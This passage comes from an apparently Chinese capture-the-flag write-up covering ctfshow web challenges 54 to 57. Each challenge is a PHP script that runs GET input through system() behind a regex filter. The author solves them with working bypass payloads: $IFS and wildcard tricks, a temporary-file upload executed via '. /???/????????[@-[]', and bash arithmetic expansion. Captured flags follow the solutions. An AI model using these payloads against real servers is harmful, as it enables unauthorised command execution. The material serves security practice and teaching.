variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span>f<span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>ls\t<span class=\"token comment\">// 先看 flag 文件名格式</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">mv</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span>fla<span class=\"token operator\">?</span><span class=\"token operator\">.</span><span class=\"token class-name type-declaration\">php</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span>a<span class=\"token operator\">.</span>txt\t<span class=\"token comment\">// 将 flag 文件改名成 a.txt</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>直接访问a<span class=\"token operator\">.</span>txt即可</pre></td></tr></table></figure><pre><code>ctfshow&#123;4e47e814-2e5f-47a0-8b02-23d0fc5cc005&#125;\n</code></pre>\n<h2 id=\"web55\"><a class=\"anchor\" href=\"#web55\">#</a> web55</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 20:03:51</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>过滤掉分号、a-z的字母、反单引号、百分号、%09、%26、&lt;&gt;\n\npayload1：\n?c=/???/????64 ????.???\t\t//利用/bin文件下base64得到flag\n\n</code></pre>\n<p>payload2：</p>\n<p>先构造 POST 方式上传数据包</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width, initial-scale=1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>POST数据包POC<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://d4b9ed05-26dc-46ee-8f55-957445c8022d.challenge.ctf.show/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">&lt;!-- 链接是当前打开的题目链接 --></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>文件名：<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>提交<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>然后再上传 php 执行命令文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/bin/sh</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ls</pre></td></tr></table></figure><p>再抓包</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230131172326458.png\" alt=\"image-20230131172326458\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230131172419233.png\" alt=\"image-20230131172419233\" /></p>\n<pre><code>ctfshow&#123;6f8b48b6-9bc6-4c7e-b670-9dbf64a9c70f&#125;\n</code></pre>\n<h2 id=\"web56\"><a class=\"anchor\" href=\"#web56\">#</a> web56</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤掉了数字</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>同web55无字母数字的命令执行</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">20</span><span class=\"token operator\">/</span><span class=\"token operator\">??</span><span class=\"token operator\">?</span><span class=\"token operator\">/</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token punctuation\">[</span>@<span class=\"token operator\">-</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;63b5cec7-6d15-42b6-bee2-fca53ac2e070&#125;\n</code></pre>\n<h2 id=\"web57\"><a class=\"anchor\" href=\"#web57\">#</a> web57</h2>\n<p>命令执行，需要严格的过滤，已测试，可绕</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-08 01:02:56</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 还能炫的动吗？</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">//flag in 36.php</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤了字母、数字、分号、<span class=\"token number\">2</span>个通配符</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>双小括号 <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>和<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号<span class=\"token punctuation\">,</span>分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>命令的执行结果。 可以使用$获取 <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> 命令的结果，这和使用$获得变量值是类似的。 可以在 <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> 前面加上$符号获取 <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> 命令的执行结果，也即获取整个表达式的值。以 c<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> 为例，即将 a<span class=\"token operator\">+</span>b 这个表达式的运算结果赋值给变量 c。 注意，类似 c<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> 这样的写法是错误的，不加$就不能取得表达式的结果。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">_</span><span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token comment\">// 返回上一次命令</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> $<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">//=0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">//~ 取反</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> $<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">//=-1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> $<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">//=-2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>以此类推得到payload</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>$<span class=\"token 